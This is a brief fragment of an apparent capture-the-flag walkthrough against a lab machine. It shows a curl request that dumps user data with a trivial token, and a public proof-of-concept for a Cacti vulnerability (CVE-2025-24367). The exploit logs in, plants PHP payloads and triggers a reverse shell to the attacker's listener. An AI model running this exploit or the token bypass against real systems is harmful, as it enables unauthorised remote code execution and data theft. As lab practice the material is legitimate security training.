curl -s "http://monitorsfour.htb/user?token=000000" | jq '.' > users.json


┌──(kali㉿kali)-[~/CVE-2025-24367-Cacti-PoC]
└─$ python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.16.67 -l 60001
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: LAUvm.php
[+] Got payload: /bash
[i] Created PHP filename: PLg62.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
                                  